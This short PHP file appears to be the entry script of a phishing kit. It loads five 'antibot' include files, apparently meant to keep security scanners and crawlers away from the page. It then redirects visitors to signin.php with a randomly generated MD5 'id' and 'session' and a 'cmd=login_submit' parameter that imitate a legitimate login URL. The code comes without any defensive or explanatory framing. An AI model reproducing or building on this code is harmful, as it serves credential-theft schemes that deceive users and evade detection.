<?php
include'./BOTS/antibot1.php';
include'./BOTS/antibots2.php';
include'./BOTS/antibots3.php';
include'./BOTS/antibots4.php';
include'./BOTS/antibots5.php';
$praga=rand();
$praga=md5($praga);
header("location: signin.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
?>